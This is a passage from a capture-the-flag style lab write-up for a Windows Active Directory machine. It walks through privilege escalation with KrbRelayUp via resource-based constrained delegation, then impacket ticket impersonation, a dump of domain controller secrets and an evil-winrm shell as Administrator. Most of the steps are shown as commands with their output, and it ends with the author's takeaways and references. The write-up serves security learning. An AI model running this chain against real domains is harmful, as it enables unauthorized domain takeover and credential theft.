KrbRelayUp utilizes Resource-Based Constrained Delegation (RBCD) to escalate privileges. RBCD can be exploited when LDAP signing and channel binding are not enforced in the domain. Due to this, Kerberos Authentication can be relayed to LDAP, allowing attacks to modify object attributes like `msDS-AllowedToActOnBehalfOfOtherIdentity`.

> **What is Resource-Based Constrained Delegatiion (RBCD)?**
> _RBCD allows a computer or user account to specify which accounts can delegate on its behalf to access resources. This configuration is stored in the Active Directory’s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. In practice, this means a computer object can say “I trust this account to impersonate users when accessing me.”_

To run KrbRelayUp for PrivEsc, we must find a COM class identifier (CLSID) for a COM object backed by a service run as SYSTEM. These are predefined by the Windows OS, meaning we can get a curated CLSID list [here](https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt). We need one that works with Windows Server 2019/2022 since that’s the OS version we’re using. KrbRelayUp can force that service to authenticate and Kerberos Authentication is relayed to LDAP, allowing an attacker to set RBCD privileges and escalate privileges.

![List of CLSIDs working on Windows Server 2019 & 2022](\images\Bruno\clsid.png)

```cmd
C:\Users\Public\Downloads>sc qc certsvc
sc qc certsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: certsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\certsrv.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Active Directory Certificate Services
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem

C:\Users\Public\Downloads>
```
We can confirm AD CS is running on the DC.

```cmd
C:\Users\Public\Downloads>.KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3}
.KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3}
KrbRelayUp - Relaying you to SYSTEM

[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Computer account "KRBRELAYUP$" added with password "bB2-cY4/hJ9=jS5#"
[+] Looking for available ports..
[+] Port 2869 available
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now ...
[+] LDAP session established
[+] RBCD rights added successfully
[+] TGT request successful!
[+] Building S4U2self
[+] Using domain controller: brunodc.bruno.vl (fe80::67:a963:2951:c432%6)
[+] Sending S4U2self request to fe80::67:a963:2951:c432%6:88
[+] S4U2self success!
[+] Got a TGS for 'Administrator' to 'KRBRELAYUP$@BRUNO.VL'
[+] Impersonating user 'Administrator' to target SPN 'HOST/BRUNODC'
[+] Building S4U2proxy request for service: 'HOST/BRUNODC'
[+] Using domain controller: brunodc.bruno.vl (fe80::67:a963:2951:c432%6)
[+] Sending S4U2proxy request to domain controller fe80::67:a963:2951:c432%6:88
[+] S4U2proxy success!
[+] Importing ticket into a sacrificial process using CreateNetOnly
Process     : 'C:\Users\Public\Downloads\krbRelayUp.exe krbscm --ServiceName "KrbSCM"' successfully created with LOGON_TYPE = 9
ProcessID   : 2548
Ticket successfully imported!
LUID        : 0x226d51
[+] System service should be started in background
```
This will create a new computer account in the domain that we control. 

```bash
(kali@kali)-[~]$ sudo impacket-getST -impersonate 'administrator' bruno.vl/'KRBRELAYUP$':'bB2-cY4/hJ9=jS5#' -spn HOST/brunodc.bruno.vl -dc-ip 10.10.98.74
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Performing S4U2self
[*] Performing S4U2proxy
[*] Saving ticket in administrator@HOST_brunodc.bruno.vl@BRUNO.VL.ccache
```
We can now use our attacker-controlled computer account to impersonate the Administrator to get the TGT of the HOST service on the DC.

```bash
export KRB5CCNAME=adminisrator@HOST_brunodc.bruno.vl@BRUNO.VL.ccache
sudo impacket-secretsdump -k brunodc.bruno.vl
```
Dump the secrets of all users on the DC.

```bash
sudo evil-winrm -i brunodc.vl -u administrator -H <hash>

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami;hostname
bruno\administrator
brunodc
```
Remote into `brunodc.vl` as the administrator.

# My Takeaways
This lab was definitely a challenge for me. No just technically, but mentally too. On top of learning new skills like DLL Hijacking and Privilege Escalation via a KrbRelayUp attack, I also encountered several instances of troubleshooting. This lab holds lots of valuable knowledge that is transferable to other similar scenarios. It’s also the first lab that made me start using Windows VMs for pentesting and hacking labs. I see the importance of using different VMs for different Operating Systems now and not just solely relying on Kali Linux. I personally find completing this lab a good skill assessment and checkpoint. Despite taking a while to figure things out, the time and effort spent was worthwhile and I enjoyed the learning process.

# References
## Blogs
1. HackTricks - Pentesting FTP (21) [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html]

2. BloodHound Community Edition (CE) [https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart]

3. ZipSlip Attack Explained [https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f]

4. jd Bruno VulnLab [https://jd-apprentice.github.io/hexo-sample/2024/08/02/bruno/index.html]

5. Vendetta0 Bruno VulnLab [https://medium.com/@Vendetta0/vulnlab-bruno-4df7d80247b0]

## Tools
1. dnSpy [https://github.com/dnSpyEx/dnSpy]

2. evilarc [https://github.com/ptoomey3/evilarc]

3. winPeas [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS]

4. KrbRelayUp [https://github.com/Dec0ne/KrbRelayUp]

5. CLSID list [https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt]

## Videos
1. Learning Reverse Engineering [https://www.youtube.com/watch?v=gh2RXE9BIN8]

2. How to download DnSpy on Windows [https://www.youtube.com/watch?v=2DzIPq8ZGnY]

3. How to open and analyze DLL files in DnSpy [https://www.youtube.com/watch?v=ANL5Gw2216o]